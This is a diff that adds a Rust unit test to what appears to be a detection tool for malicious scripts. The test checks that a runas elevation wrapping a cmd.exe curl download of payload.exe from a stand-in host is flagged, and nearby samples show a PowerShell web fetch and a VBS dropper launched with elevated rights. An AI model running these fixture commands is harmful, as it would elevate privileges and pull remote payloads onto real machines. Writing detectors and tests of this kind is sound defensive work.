@@ -1620,6 +1620,35 @@ sh.Run("powershell -Command Invoke-WebRequest https://direct-js-const.example/p"
     }
 
     #[test]
+    fn native_runas_replays_quoted_child_command() {
+        let script = br#"runas /user:Administrator "cmd.exe /V:ON /c set U=https://runas-native.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation { target, args }
+                    if target == "cmd.exe"
+                        && args
+                            .as_deref()
+                            .is_some_and(|value| value.contains("curl -o payload.exe"))
+            )),
+            "native runas SelfElevation not detected: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://runas-native.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "native runas child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn vbs_shell_execute_runas_emits_self_elevation_trait() {
         let script = br#"Set UAC = CreateObject("Shell.Application")
 UAC.ShellExecute "cmd.exe", "/c ""C:\Users\me\dropper.bat""", "", "runas", 1"#;
